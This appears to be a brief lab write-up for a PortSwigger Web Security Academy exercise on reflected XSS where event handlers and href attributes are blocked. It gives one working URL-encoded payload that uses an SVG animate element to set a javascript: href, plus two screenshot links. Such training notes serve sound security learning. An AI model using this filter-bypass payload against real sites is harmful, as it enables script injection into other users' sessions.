# EXPERT: Reflected XSS with event handlers and href attributes blocked

This lab has a quite interesting XSS attack vector:

```jsx
https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
```

![Снимок экрана 2025-12-01 в 10.49.20.png](EXPERT%20Reflected%20XSS%20with%20event%20handlers%20and%20href%20/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-01_%D0%B2_10.49.20.png)

![Снимок экрана 2025-12-01 в 10.52.21.png](EXPERT%20Reflected%20XSS%20with%20event%20handlers%20and%20href%20/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-01_%D0%B2_10.52.21.png)